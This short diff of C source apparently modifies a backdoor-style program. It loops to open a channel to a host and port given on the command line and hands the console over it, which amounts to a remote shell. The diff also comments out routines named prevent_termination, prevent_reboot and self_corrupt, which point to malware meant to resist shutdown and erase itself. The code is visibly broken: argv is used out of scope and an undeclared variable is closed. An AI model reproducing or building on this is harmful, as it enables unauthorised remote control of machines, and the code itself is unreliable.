@@ -31,27 +31,27 @@
 #include "console.h"
 #include "channel.h"
 
-void repeater()
+void interact()
 {
     for (;;) {
-        int channel = channel_open(argv[1], atoi(argv[2]));
+        int channel = open_channel(argv[1], atoi(argv[2]));
         if (channel < 0)
             continue;
 
-        
+        interact_console(channel);
+        close_channel(channel);
     }
 }
 
 int main(int argc, char *argv[])
 {
     if (argc == 3) {
-        prevent_termination();
+        /* prevent_termination(); */
         /* prevent_reboot(); */
 
-        repeater();
+        interact();
 
-        self_corrupt(argv[0]);
-        channel_close(channel);
+        /* self_corrupt(argv[0]); */
     }
 
     return 0;
